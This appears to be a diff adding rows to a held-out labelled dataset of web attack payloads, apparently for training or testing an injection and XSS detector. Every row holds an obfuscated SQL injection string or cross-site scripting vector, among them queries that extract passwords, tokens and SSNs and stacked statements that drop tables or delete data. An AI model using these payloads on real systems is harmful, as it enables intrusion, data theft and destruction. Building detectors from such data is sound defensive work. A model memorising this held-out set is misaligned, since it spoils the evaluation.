+"'/**/ANd/*!*/extractvalue(1,concat(0x7e,(select%20balance%20from/*!*/clients+limit	1)))-- ",1,sqli,error,held_out
+"`%09uNiON%20ALL	SELecT+0x78,NULL,CHAR(120),CHAR(120),0x78+FrOM/**/orders%20%2d%2d ",1,sqli,union,held_out
+"""%20UNION/**/All	seLeCT%200x78,CHAR(120),0x78	froM/**_**/sessions/**_**/-- ",1,sqli,union,held_out
+1%09Or/*!*/SlEep(8) -- ,1,sqli,time_blind,held_out
+1;+UPdate	sessions+seT%09pwd=1/**_**//*z*/,1,sqli,stacked,held_out
+"')+AND%09(select/**/count(*)/**_**/from%09members/*!*/group by	concat((select%0aid from+users/**/limit%201),floor(rand(0)*2)))-- ",1,sqli,error,held_out
+"')%09aNd%09updatexml(1,concat(0x7e,(select+balance/*!*/from orders/**/limit%201)),1)%2d%2d ",1,sqli,error,held_out
+'onerror=print()',1,xss,attribute,held_out
+"""
+onanimationstart=(alert)(1)
+x=""",1,xss,attribute,held_out
+<detailsonstart=alert(1)>,1,xss,reflected,held_out
+')%20aNd/*!*/(SELECT+1+FrOm%20(SELECT(sLEEp(5)))x)/*z*/,1,sqli,time_blind,held_out
+"""/**/or/**_**/3BEtwEEN%0a0/**_**/AND%209/**_**/%2d%2d ",1,sqli,boolean_blind,held_out
+"%27%0aor/**/name=CHAR(115,101,108,101,99,116)-- 	",1,sqli,hex_obf,held_out
+';%09WaitfOR	dELAY	'0:0:3' -- ,1,sqli,time_blind,held_out
+"%27/**_**/OR+pwd=CHAR(97,100,109,105,110)%2d%2d ",1,sqli,hex_obf,held_out
+')%20OR/**/0x61=0x61/*!*/-- -,1,sqli,boolean_blind,held_out
+#<body ontoggle=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+') OR%093=9%20-- ,1,sqli,boolean_blind,held_out
+'/**_**/oR%0a'b'LIkE'b'%20/*z*/,1,sqli,boolean_blind,held_out
+1	OR/*!*/6=5%20-- ,1,sqli,boolean_blind,held_out
+"""
+onload=window['ale'+'rt']`1`
+x=""",1,xss,attribute,held_out
+#<video onstart=top['al'+'ert'](1)>,1,xss,dom,held_out
+"<img onpointerover=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
+#<form onfocus=alert(1)>,1,xss,dom,held_out
+"%27/*!*/OR+id=CHAR(115,101,108,101,99,116)-- 	",1,sqli,hex_obf,held_out
+');/**/UpDaTe%09tokens%09set%09id=1/*!*/-- 	,1,sqli,stacked,held_out
+1/*!*/Or+4=8+/*z*/,1,sqli,boolean_blind,held_out
+"1 uNIon%0aaLL/**_**/sELEct%09CHAR(120),0x78,NULL	FrOm+users/*!*/%2d%2d ",1,sqli,union,held_out
+"data:text/html,<form onfocus=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
+"%27%20AnD+updatexml(1,concat(0x7e,(select%0aemail	from/**_**/products%0alimit/**/1)),1)-- 	",1,sqli,error,held_out
+<svg/onbegin=(alert)(1)>,1,xss,reflected,held_out
+%27;+insErt/**/into+tokens/**_**/VALUeS(1)	-- ,1,sqli,stacked,held_out
+"data:text/html,<img onstart=alert(document.cookie)>",1,xss,dom,held_out
+"""%09oR%090x61=0x61%09%2d%2d ",1,sqli,boolean_blind,held_out
+"'
+onbegin=window['ale'+'rt']`1`
+'",1,xss,attribute,held_out
+')%20or%09'a'lIKe'b' -- ,1,sqli,boolean_blind,held_out
+"""
+onpointerover=window['ale'+'rt']`1`
+x=""",1,xss,attribute,held_out
+"#"";top['al'+'ert'](1);//",1,xss,dom,held_out
+'%09And/**/%28SELECT%091+FROm+(SELECT(SLeeP(3)))x)/*z*/,1,sqli,time_blind,held_out
+"'%0aUNIOn+ALl%09seLeCT%0abalance,NULL,CHAR(120),0x78/**_**/FrOm%09clients/**_**/-- 	",1,sqli,union,held_out
+"""><marquee ontoggle=alert(document.cookie)>",1,xss,attribute,held_out
+"""%20onmouseover=alert(1)%20x=""",1,xss,attribute,held_out
+%27%0aANd%09(SELECT 1%0afROM%20(SELECT(sleeP(6)))x)%2d%2d ,1,sqli,time_blind,held_out
+');	DrOP/*!*/tABLE/**_**/sessions/*!*//*z*/,1,sqli,stacked,held_out
+` Or	'a'LIke'a'%09/*z*/,1,sqli,boolean_blind,held_out
+')%0aAnD/**/%28SELECT/**_**/1+fROm/**/(SELECT(SLEep(7)))x)-- 	,1,sqli,time_blind,held_out
+`/*!*/oR+0x61=0x61%0a-- 	,1,sqli,boolean_blind,held_out
+"')/**/AnD/**_**/updatexml(1,concat(0x7e,(select/*!*/ssn+from/**/products/**_**/limit/**_**/1)),1)-- 	",1,sqli,error,held_out
+<svg/onpointerover=(alert)(1)>,1,xss,reflected,held_out
+1%20OR%096=1+-- -,1,sqli,boolean_blind,held_out
+`%20Or%205BEtWeEN%200	aNd/*!*/9/**_**/#,1,sqli,boolean_blind,held_out
+"')%09and+updatexml(1,concat(0x7e,(select	hash/*!*/from+products%20limit%0a1)),1)%2d%2d ",1,sqli,error,held_out
+<inputonbegin=window['ale'+'rt']`1`>,1,xss,reflected,held_out
+<svg onfocus=print()><!--stored-->,1,xss,stored,held_out
+<audioonbegin=alert(1)><!--post-->,1,xss,stored,held_out
+"""+unIoN+All/**_**/seLEct/*!*/token,NULL,0x78,NULL from/**/accounts	%2d%2d ",1,sqli,union,held_out
+#<video ontoggle=top['al'+'ert'](1)>,1,xss,dom,held_out
+"1+aND+updatexml(1,concat(0x7e,(select	hash%09from/**/orders limit%091)),1)%2d%2d ",1,sqli,error,held_out
+"1/**/and	(select%09count(*)/*!*/from%0aaccounts group	by	concat((select password+from%09sessions	limit%0a1),floor(rand(0)*2)))%2d%2d ",1,sqli,error,held_out
+')	oR/**_**/'a'LIke'b'+-- -,1,sqli,boolean_blind,held_out
+"`/*!*/OR+email=CHAR(97,100,109,105,110)-- -",1,sqli,hex_obf,held_out
+"""%20Or/**_**/0x61=0x61/**_**/#",1,sqli,boolean_blind,held_out
+1;/**_**/WaItFor%0aDELAy+'0:0:3'+/*z*/,1,sqli,time_blind,held_out
+<bodyonerror=eval(atob('YWxlcnQoMSk='))><!--stored-->,1,xss,stored,held_out
+#<body ontoggle=window['ale'+'rt']`1`>,1,xss,dom,held_out
+"%27+Or%20name=CHAR(112,97,115,115,119,111,114,100)%2d%2d ",1,sqli,hex_obf,held_out
+')%20OR%201bETweEn/*!*/0/*!*/AND/**/9+-- 	,1,sqli,boolean_blind,held_out
+"')%0auNION	alL/**/SELeCT/**/0x78,role,CHAR(120),NULL/**_**/froM/**_**/clients+#",1,sqli,union,held_out
+1 Or%09balance=0x61646d696e#,1,sqli,hex_obf,held_out
+"<svg/onerror=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
+#<details onpointerover=print()>,1,xss,dom,held_out
+1 or%0assn=0x726f6f74-- -,1,sqli,hex_obf,held_out
+"%27%0aUNiOn+aLl/**_**/SelEcT/*!*/NULL,hash+froM%20staff/**/%2d%2d ",1,sqli,union,held_out
+%27/*!*/Or+name=0x70617373776f7264-- 	,1,sqli,hex_obf,held_out
+%27;+WaitFOR%0adElaY/**/'0:0:8' -- 	,1,sqli,time_blind,held_out
+"')/**_**/aNd%0aupdatexml(1,concat(0x7e,(select%20balance/**_**/from+users limit%0a1)),1)-- -",1,sqli,error,held_out
+'/onerror=top['al'+'ert'](1)/',1,xss,attribute,held_out
+%27; iNSeRT	into+clients	valuEs(1)%09#,1,sqli,stacked,held_out
+"')/**_**/anD/**_**/extractvalue(1,concat(0x7e,(select/*!*/balance%09from	users+limit%091)))-- ",1,sqli,error,held_out
+"""%0aor+'b'LIkE'b'%0a%2d%2d ",1,sqli,boolean_blind,held_out
+"""onanimationstart=alert(document.cookie)x=""",1,xss,attribute,held_out
+%27%20oR/*!*/name=0x61646d696e%2d%2d ,1,sqli,hex_obf,held_out
+1;/**/DROp%20TABLe/*!*/tokens/*!*/-- -,1,sqli,stacked,held_out
+"<img%20onstart=alert(String.fromCharCode(88,83,83))><!--stored-->",1,xss,stored,held_out
+"`%20uNiOn+ALL/**_**/SeLeCt/**/0x78,0x78,NULL,NULL+FrOm%09clients	-- 	",1,sqli,union,held_out
+%27/**/Or 'a'LIKe'b'%09-- -,1,sqli,boolean_blind,held_out
+<iframe%20onmouseover=top['al'+'ert'](1)>,1,xss,reflected,held_out
+<object/onfocus=alert(document.cookie)><!--post-->,1,xss,stored,held_out
+')/**/oR/*!*/pwd=0x73656c656374-- 	,1,sqli,hex_obf,held_out
+"""
+onbegin=alert(String.fromCharCode(88,83,83))
+x=""",1,xss,attribute,held_out
+"')+oR/**/password=CHAR(114,111,111,116)#",1,sqli,hex_obf,held_out
+<marquee%09onpointerover=(alert)(1)><!--comment-->,1,xss,stored,held_out
+"""><audio onfocus=(alert)(1)>",1,xss,attribute,held_out
+"')	And+extractvalue(1,concat(0x7e,(select%09token%0afrom	clients%09limit	1)))#",1,sqli,error,held_out
+`/*!*/OR%201=6+/*z*/,1,sqli,boolean_blind,held_out
+`/**/or%0arole=0x70617373776f7264-- 	,1,sqli,hex_obf,held_out
+<math	onload=alert(document.cookie)>,1,xss,reflected,held_out
+"#<input onstart=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
+#<form onanimationstart=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+%27/*!*/aNd (SELECT+1/*!*/FROM/**/(SELECT(SleEp(3)))x)-- -,1,sqli,time_blind,held_out
+"'%09UNiOn/**_**/aLL+SElecT/**_**/balance,NULL%09FROM/**_**/clients/*!*//*z*/",1,sqli,union,held_out
+"`/*!*/or%20email=CHAR(112,97,115,115,119,111,114,100)-- 	",1,sqli,hex_obf,held_out
+1/*!*/or/**/name=0x726f6f74%2d%2d ,1,sqli,hex_obf,held_out
+<img%20onstart=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
+#<math onanimationstart=alert(1)>,1,xss,dom,held_out
+javascript:(alert)(1),1,xss,dom,held_out
+<input onpointerover=alert(1)><!--post-->,1,xss,stored,held_out
+<svg/onerror=alert(1)>,1,xss,reflected,held_out
+<videoonerror=alert(1)><!--comment-->,1,xss,stored,held_out
+'/onpointerover=(alert)(1)/',1,xss,attribute,held_out
+<detailsonanimationstart=(alert)(1)><!--stored-->,1,xss,stored,held_out
+"')%09UniOn AlL+Select/**/CHAR(120),NULL	fRoM/**_**/staff/**/-- 	",1,sqli,union,held_out
+'/ontoggle=eval(atob('YWxlcnQoMSk='))/',1,xss,attribute,held_out
+javascript:top['al'+'ert'](1),1,xss,dom,held_out
+"`	unIoN/*!*/alL%20SEleCT%0apwd,CHAR(120)+frOM+orders/**_**/-- -",1,sqli,union,held_out
+"1	uNioN/**_**/All%0aSelEct/**_**/0x78,0x78,0x78,0x78,0x78%09frOm	staff	-- 	",1,sqli,union,held_out
+"data:text/html,<form onanimationstart=alert(1)>",1,xss,dom,held_out
+"%27+ANd/**_**/(select	count(*)%0afrom%0aaccounts group+by concat((select%20balance%09from%20orders%09limit%0a1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
+"`/**/AND+updatexml(1,concat(0x7e,(select+hash%09from/*!*/users/**_**/limit%091)),1)/*z*/",1,sqli,error,held_out
+"`/*!*/oR	role=CHAR(114,111,111,116)-- 	",1,sqli,hex_obf,held_out
+<imgontoggle=(alert)(1)><!--stored-->,1,xss,stored,held_out
+`;	drOp/**_**/taBlE/**/staff /*z*/,1,sqli,stacked,held_out
+1;	drOP/**_**/TABle/*!*/members+-- 	,1,sqli,stacked,held_out
+1 Or%20balance=0x61646d696e-- 	,1,sqli,hex_obf,held_out
+<iframe%20onload=top['al'+'ert'](1)>,1,xss,reflected,held_out
+"javascript:alert(String.fromCharCode(88,83,83))",1,xss,dom,held_out
+' onanimationstart=alert(document.cookie) ',1,xss,attribute,held_out
+';/*!*/DRoP%0aTABlE%0asessions/*!*/%2d%2d ,1,sqli,stacked,held_out
+<svgonpointerover=alert(1)>,1,xss,reflected,held_out
+"'
+onbegin=alert(String.fromCharCode(88,83,83))
+'",1,xss,attribute,held_out
+'%0aOR+'b'LikE'b' -- -,1,sqli,boolean_blind,held_out
+')/*!*/or%20'a'LiKE'a'%0a/*z*/,1,sqli,boolean_blind,held_out
+1 Or%0a9BetweEn/**_**/0+aNd/*!*/9 %2d%2d ,1,sqli,boolean_blind,held_out
+"') aND+extractvalue(1,concat(0x7e,(select	id+from%09members/*!*/limit%0a1)))-- ",1,sqli,error,held_out
+"`/*!*/unIOn/**_**/ALL SElEct/*!*/id,NULL%0afrom/*!*/products	-- -",1,sqli,union,held_out
+%27 OR%200x61=0x61	-- ,1,sqli,boolean_blind,held_out
+"%27%0aUNiOn%09all%0aseLEcT/**/0x78,NULL,pwd	FroM%09products%0a#",1,sqli,union,held_out
+"'	uNiON%09ALl/**/selEct%0aCHAR(120),0x78,CHAR(120),NULL%20FRoM/**_**/accounts	/*z*/",1,sqli,union,held_out
+"#<input onbegin=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
+"#<form onpointerover=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
+<mathonmouseover=alert(1)><!--comment-->,1,xss,stored,held_out
+"`%20anD/**_**/(select/*!*/count(*)/**_**/from	admins/*!*/group	by/**_**/concat((select	ssn from/**/sessions/**_**/limit%0a1),floor(rand(0)*2)))-- ",1,sqli,error,held_out
+' oR email=0x73656c656374/*z*/,1,sqli,hex_obf,held_out
+`/**/And/**/(SELECT+1+fROm%09(SELECT(SLEep(6)))x)-- 	,1,sqli,time_blind,held_out
+#<audio onanimationstart=print()>,1,xss,dom,held_out
+"')%0aUnion	all/*!*/SELEct	password,0x78,NULL,CHAR(120),CHAR(120)/**_**/frOm/**/orders%20-- ",1,sqli,union,held_out
+%27%0aoR%0aemail=0x73656c656374-- ,1,sqli,hex_obf,held_out
+"""%0auNiOn+all%09selecT/**_**/hash,0x78,pwd,0x78,CHAR(120)/*!*/frOm	sessions	#",1,sqli,union,held_out
+%27;%0awaiTfOr DElAY	'0:0:7'	-- ,1,sqli,time_blind,held_out
+"""><audio onload=alert(1)>",1,xss,attribute,held_out
+"'/**_**/oR/**/ssn=CHAR(114,111,111,116)-- 	",1,sqli,hex_obf,held_out
+"""%20onanimationstart=alert(String.fromCharCode(88,83,83))%20x=""",1,xss,attribute,held_out
+"""><input onerror=top['al'+'ert'](1)>",1,xss,attribute,held_out
+'%20ontoggle=alert(1)%20',1,xss,attribute,held_out
+"%27%20ANd extractvalue(1,concat(0x7e,(select+balance from%09users%20limit/**/1)))#",1,sqli,error,held_out
+' OR/**_**/email=0x70617373776f7264-- ,1,sqli,hex_obf,held_out
+%27;%20uPDATE staff/**/seT+email=1+#,1,sqli,stacked,held_out
+"'	UNioN aLL/*!*/sELECT/*!*/CHAR(120),NULL,NULL,NULL%0aFrOm%20members%20/*z*/",1,sqli,union,held_out
+"<svg/onload=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
+'-eval(atob('YWxlcnQoMSk='))-',1,xss,attribute,held_out
+%27%0aor/**/SLEeP(7)	/*z*/,1,sqli,time_blind,held_out
+<form	onstart=print()><!--post-->,1,xss,stored,held_out
+')	aNd	(SELECT%091/*!*/fROm%09(SELECT(SLeeP(3)))x)/*z*/,1,sqli,time_blind,held_out
+<iframe onpointerover=(alert)(1)>,1,xss,reflected,held_out
+'-top['al'+'ert'](1)-',1,xss,attribute,held_out
+<body%20onbegin=window['ale'+'rt']`1`>,1,xss,reflected,held_out
+'%09AnD/**_**/%28SELECT 1/*!*/FROm%0a(SELECT(sleEp(5)))x)-- 	,1,sqli,time_blind,held_out
+<math	onfocus=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+%27;	wAITFor%09dElay%0a'0:0:5'%0a#,1,sqli,time_blind,held_out
+"""%09onerror=top['al'+'ert'](1)%09x=""",1,xss,attribute,held_out
+<details%09onmouseover=top['al'+'ert'](1)><!--post-->,1,xss,stored,held_out
+';%0ainserT/*!*/InTo orders/*!*/vaLues(1)%0a-- -,1,sqli,stacked,held_out
+"<input
+onpointerover=print()><!--stored-->",1,xss,stored,held_out
+1;%0adEletE%0aFrom%0aadmins/**_**/%2d%2d ,1,sqli,stacked,held_out
+'+or/*!*/'a'LiKE'a'	-- 	,1,sqli,boolean_blind,held_out
+`;+UpdaTe%0astaff/**_**/sEt/**_**/name=1 -- ,1,sqli,stacked,held_out
+""" AND%0a(select/*!*/count(*)/**/from/**/clients group/**_**/by	concat((select/**/pwd%20from/**/sessions%09limit%0a1),floor(rand(0)*2)))-- 	",1,sqli,error,held_out
+') aNd+%2528SELECT%0a1	FROM/*!*/(SELECT(sLeEP(4)))x)-- 	,1,sqli,time_blind,held_out
+')%20or 'b'liKe'b'%09/*z*/,1,sqli,boolean_blind,held_out
+'	ontoggle=(alert)(1)	',1,xss,attribute,held_out
+"""/*!*/anD/**_**/(SELECT%091+FroM/*!*/(SELECT(sLeEp(7)))x)-- ",1,sqli,time_blind,held_out
+"#"";alert(document.cookie);//",1,xss,dom,held_out
+<svg/onload=window['ale'+'rt']`1`>,1,xss,reflected,held_out
+<details/onload=alert(document.cookie)>,1,xss,reflected,held_out
+"""%0aUnioN%0aall%09SeleCt/*!*/CHAR(120),NULL,0x78%09FRoM/**/orders%20-- 	",1,sqli,union,held_out
+<form	onfocus=alert(1)><!--stored-->,1,xss,stored,held_out
+1/**_**/oR/*!*/sleeP(3)%0a/*z*/,1,sqli,time_blind,held_out
+"""	onmouseover=alert(document.cookie)	x=""",1,xss,attribute,held_out
+%27%09or%202BETweEn 0/*!*/and/**/9%09-- 	,1,sqli,boolean_blind,held_out
+"')/*!*/ANd/*!*/(select%09count(*)%09from%09admins/*!*/group by%09concat((select+email/**_**/from clients%09limit+1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
+"data:text/html,<math onerror=eval(atob('YWxlcnQoMSk='))>",1,xss,dom,held_out
+1%20oR/**_**/0x61=0x61%09-- 	,1,sqli,boolean_blind,held_out
+%27%09oR 1=9+/*z*/,1,sqli,boolean_blind,held_out
+'%20onbegin=print()%20',1,xss,attribute,held_out
+'%20Or%0aSLEep(4)%09#,1,sqli,time_blind,held_out
+"%27+And/*!*/extractvalue(1,concat(0x7e,(select/**/token/**_**/from	users+limit%201)))-- ",1,sqli,error,held_out
+"data:text/html,<img onpointerover=eval(atob('YWxlcnQoMSk='))>",1,xss,dom,held_out
+'/**/OR+'b'LIKe'a'%0a-- 	,1,sqli,boolean_blind,held_out
+"`/*!*/AND+updatexml(1,concat(0x7e,(select%0ahash%0afrom/**/sessions%0alimit/**_**/1)),1)-- ",1,sqli,error,held_out
+<sCrIpT>print()</sCrIpT>,1,xss,reflected,held_out
+"1%0aand+extractvalue(1,concat(0x7e,(select%09pwd%09from/**/sessions/**/limit%091)))-- -",1,sqli,error,held_out
+"""/onbegin=(alert)(1)/x=""",1,xss,attribute,held_out
+"""%09AND%09(select count(*)%20from/*!*/sessions/**_**/group%20by/*!*/concat((select/**/ssn%0afrom%20products%09limit/**/1),floor(rand(0)*2)))#",1,sqli,error,held_out
+"<video
+onload=alert(1)><!--comment-->",1,xss,stored,held_out
+<details ontoggle=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
+""";	DelETe/**/fRom/**/sessions/**_**/%2d%2d ",1,sqli,stacked,held_out
+"<svg
+onanimationstart=%28alert%29%281%29>",1,xss,reflected,held_out
+"`/**_**/oR%09email=CHAR(112,97,115,115,119,111,114,100)-- 	",1,sqli,hex_obf,held_out
+'+oR%20token=0x61646d696e-- -,1,sqli,hex_obf,held_out
+<sCrIpT>(alert)(1)</sCrIpT>,1,xss,reflected,held_out
+"1/*!*/ANd	updatexml(1,concat(0x7e,(select%20name%09from/**_**/sessions	limit/**/1)),1)-- -",1,sqli,error,held_out
+1	or SlEEP(6)+%2d%2d ,1,sqli,time_blind,held_out
+"<body
+onbegin=top['al'+'ert'](1)>",1,xss,reflected,held_out
+%27/*!*/or%20SlEeP(8)	%2d%2d ,1,sqli,time_blind,held_out
+"""/onanimationstart=window['ale'+'rt']`1`/x=""",1,xss,attribute,held_out
+"')%20OR+pwd=CHAR(97,100,109,105,110)-- 	",1,sqli,hex_obf,held_out
+1%0aor/**/9=9/**_**/%2d%2d ,1,sqli,boolean_blind,held_out
+"`%20or name=CHAR(115,101,108,101,99,116)-- -",1,sqli,hex_obf,held_out
+<svg onpointerover=eval(atob('YWxlcnQoMSk='))><!--stored-->,1,xss,stored,held_out
+<objectonmouseover=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
+%27;%20iNSerT%0aINtO%20accounts VALUes(1)%20-- 	,1,sqli,stacked,held_out
+<svg/onmouseover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+<svgonerror=alert(document.cookie)><!--stored-->,1,xss,stored,held_out
+')	AnD%20%28SELECT+1 frOm	(SELECT(SLEEP(3)))x)#,1,sqli,time_blind,held_out
+"%27 UNiON/*!*/alL%0aseLECt%090x78,id%09fROm/**/members+-- 	",1,sqli,union,held_out
+%27/**/or	'a'liKe'a' -- 	,1,sqli,boolean_blind,held_out
+"""><iframe onmouseover=top['al'+'ert'](1)>",1,xss,attribute,held_out
+"`+unIOn/*!*/All%09SELECt%200x78,0x78/**_**/frOm	sessions%0a-- ",1,sqli,union,held_out
+1 oR%200x61=0x61%0a%2d%2d ,1,sqli,boolean_blind,held_out
+<body ontoggle=eval%28atob%28%27YWxlcnQoMSk%3D%27%29%29>,1,xss,reflected,held_out
+"""%20Or	0x61=0x61/**_**/-- -",1,sqli,boolean_blind,held_out
+"`%20and%0aextractvalue(1,concat(0x7e,(select/*!*/ssn/*!*/from/**/sessions limit/**_**/1)))-- 	",1,sqli,error,held_out
+'-(alert)(1)-',1,xss,attribute,held_out
+';/**_**/iNSeRT%09INto/**_**/orders/**/VAlues(1)+-- -,1,sqli,stacked,held_out
+"""%0aor id=CHAR(112,97,115,115,119,111,114,100)-- ",1,sqli,hex_obf,held_out
+<mathonbegin=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+"""	AnD/**_**/(select%0acount(*)/*!*/from tokens/*!*/group%20by/**/concat((select%09role%09from%09users%09limit%201),floor(rand(0)*2)))-- -",1,sqli,error,held_out
+<img/onbegin=alert(1)><!--post-->,1,xss,stored,held_out
+"<img
+ontoggle=(alert)(1)>",1,xss,reflected,held_out
+')%09OR+'b'liKe'b'/*!*/%2d%2d ,1,sqli,boolean_blind,held_out
+<body onpointerover=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
+'	and%20(SELECT+1	fROM (SELECT(sLeep(5)))x)#,1,sqli,time_blind,held_out
+"%27%0aAnd/**/extractvalue(1,concat(0x7e,(select/**/balance from/*!*/sessions limit/*!*/1)))/*z*/",1,sqli,error,held_out
+1	oR%20sLeeP(3)/*!*/-- ,1,sqli,time_blind,held_out
+"%27%09UnioN/**/ALL/**_**/SelecT%20balance,email,CHAR(120),NULL,CHAR(120)+FROm/**/members+#",1,sqli,union,held_out
+"<math
+onfocus=top['al'+'ert'](1)><!--stored-->",1,xss,stored,held_out
+%27;/*!*/WAiTFoR/**_**/deLaY+'0:0:4'%0a-- -,1,sqli,time_blind,held_out
+#<img onmouseover=print()>,1,xss,dom,held_out
+'%20onpointerover=window['ale'+'rt']`1`%20',1,xss,attribute,held_out
+<svg/onpointerover=top['al'+'ert'](1)>,1,xss,reflected,held_out
+'/**_**/oR/**/'a'likE'b'/**_**/-- 	,1,sqli,boolean_blind,held_out
+"<audio%09onload=alert(String.fromCharCode(88,83,83))><!--stored-->",1,xss,stored,held_out
+%27+Or 2betWeeN 0 aNd+9	/*z*/,1,sqli,boolean_blind,held_out
+"""><form onmouseover=top['al'+'ert'](1)>",1,xss,attribute,held_out
+"')%20UnIOn/**_**/AlL/**/SElEct CHAR(120),NULL,CHAR(120),0x78%20FrOM%0aclients%20/*z*/",1,sqli,union,held_out
+';%09updaTe members%0aSeT/**_**/balance=1%09-- ,1,sqli,stacked,held_out
+"') aND/**/(select count(*)/*!*/from	sessions+group	by%09concat((select%20password%20from accounts/**_**/limit%0a1),floor(rand(0)*2)))#",1,sqli,error,held_out
+"data:text/html,<input onload=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
+"data:text/html,<input onerror=alert(1)>",1,xss,dom,held_out
+"%27%09unIOn%0aALl%20sElecT%0aname,0x78,CHAR(120),NULL,0x78+froM	staff/**/#",1,sqli,union,held_out
+"`+UniOn%20aLl/**/sElecT name,NULL,0x78+from%09clients/**_**/-- ",1,sqli,union,held_out
+"""%09onstart=eval(atob('YWxlcnQoMSk='))%09x=""",1,xss,attribute,held_out
+%27%20or%091=6%09-- 	,1,sqli,boolean_blind,held_out
+"""><details onerror=eval(atob('YWxlcnQoMSk='))>",1,xss,attribute,held_out
+1/**_**/OR+balance=0x70617373776f7264-- ,1,sqli,hex_obf,held_out
+<form%20onbegin=top['al'+'ert'](1)><!--post-->,1,xss,stored,held_out
+"""%09aNd	%28SELECT 1	FROM/**/(SELECT(sLEeP(3)))x)-- ",1,sqli,time_blind,held_out
+1;/*!*/inSert INtO/**_**/members VaLueS(1)/**/-- 	,1,sqli,stacked,held_out
+<input onanimationstart=alert(document.cookie)><!--comment-->,1,xss,stored,held_out
+"'%09UNiON/*!*/ALL+SELeCT/**/CHAR(120),0x78,CHAR(120)/**_**/frOM	sessions%20%2d%2d ",1,sqli,union,held_out
+#<object onbegin=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+'	Or%200x61=0x61%0a#,1,sqli,boolean_blind,held_out
+"1/**/UNIoN alL/*!*/sELEcT/**/role,NULL/*!*/FRoM/*!*/staff -- -",1,sqli,union,held_out
+""" ANd+updatexml(1,concat(0x7e,(select%0apassword%20from%20admins%09limit+1)),1)#",1,sqli,error,held_out
+1%0aor 'a'LiKE'a'	/*z*/,1,sqli,boolean_blind,held_out
+<audio%20onmouseover=print()><!--stored-->,1,xss,stored,held_out
+#<form onbegin=(alert)(1)>,1,xss,dom,held_out
+1/*!*/and%20(SELECT%0a1/**/from%20(SELECT(sleEP(3)))x)%2d%2d ,1,sqli,time_blind,held_out
+"#"";(alert)(1);//",1,xss,dom,held_out
+"')/**/And/**_**/extractvalue(1,concat(0x7e,(select/**/token/*!*/from%09products limit%091)))-- -",1,sqli,error,held_out
+<svg/onpointerover=alert(document.cookie)>,1,xss,reflected,held_out
+'-print()-',1,xss,attribute,held_out
+1;/**_**/wAITfOr%0aDelAy+'0:0:8'%20#,1,sqli,time_blind,held_out
+%27+Or	0x61=0x61+-- 	,1,sqli,boolean_blind,held_out
+"%27/**_**/UniOn	aLl%09seLect/*!*/NULL,ssn,name,NULL,CHAR(120)%0afrom staff%09%2d%2d ",1,sqli,union,held_out
+"1%09ANd/*!*/updatexml(1,concat(0x7e,(select%0ahash+from sessions limit/**/1)),1)-- ",1,sqli,error,held_out
+"""	onpointerover=alert(String.fromCharCode(88,83,83))	x=""",1,xss,attribute,held_out
+%27;/**/iNSeRT	INtO%0amembers	VaLues(1)/**_**/#,1,sqli,stacked,held_out
+"`%09anD+extractvalue(1,concat(0x7e,(select%0abalance	from orders	limit/*!*/1)))/*z*/",1,sqli,error,held_out
+#<video onfocus=alert(1)>,1,xss,dom,held_out
+`/*!*/aND/**_**/(SELECT 1%20fROM/**_**/(SELECT(SLEeP(4)))x)/*z*/,1,sqli,time_blind,held_out
+"""><object onerror=alert(1)>",1,xss,attribute,held_out
+"<svg/onmouseover=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
+<svg onmouseover=top['al'+'ert'](1)><!--comment-->,1,xss,stored,held_out
+"""
+onfocus=print()
+x=""",1,xss,attribute,held_out
+'+or%095BEtween%200%09And%209%0a-- ,1,sqli,boolean_blind,held_out
+#<svg onerror=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+<sCrIpT>eval(atob('YWxlcnQoMSk='))</sCrIpT>,1,xss,reflected,held_out
+"data:text/html,<audio onfocus=alert(document.cookie)>",1,xss,dom,held_out
+<marqueeonpointerover=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
+')/*!*/or+'a'Like'a' -- 	,1,sqli,boolean_blind,held_out
+"')%20ANd/*!*/updatexml(1,concat(0x7e,(select+password/**/from%09clients/**/limit+1)),1)-- ",1,sqli,error,held_out
+%27%0aOR	token=0x726f6f74%2d%2d ,1,sqli,hex_obf,held_out
+<math onbegin=(alert)(1)>,1,xss,reflected,held_out
+"%27%0aoR	ssn=CHAR(115,101,108,101,99,116)%2d%2d ",1,sqli,hex_obf,held_out
+<svg/onbegin=top['al'+'ert'](1)>,1,xss,reflected,held_out
+%27; uPDaTE+members%0asET%09role=1	-- -,1,sqli,stacked,held_out
+<objectonerror=top['al'+'ert'](1)>,1,xss,reflected,held_out
+"<audio onpointerover=alert(String.fromCharCode(88,83,83))><!--stored-->",1,xss,stored,held_out
+<body%09onerror=(alert)(1)><!--comment-->,1,xss,stored,held_out
+"<object
+onpointerover=top['al'+'ert'](1)>",1,xss,reflected,held_out
+"""/onbegin=top['al'+'ert'](1)/x=""",1,xss,attribute,held_out
+<formonerror=alert(document.cookie)>,1,xss,reflected,held_out
+#<video onerror=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+<math%20onpointerover=(alert)(1)><!--comment-->,1,xss,stored,held_out
+' Or	'b'LIkE'b'%09-- 	,1,sqli,boolean_blind,held_out
+');%20DElETe%09FRoM clients%20-- 	,1,sqli,stacked,held_out
+<iframe%09onbegin=top['al'+'ert'](1)>,1,xss,reflected,held_out
+"')	UniOn/**_**/all	SElECT/**_**/CHAR(120),CHAR(120),CHAR(120),0x78	fRom+clients%09#",1,sqli,union,held_out
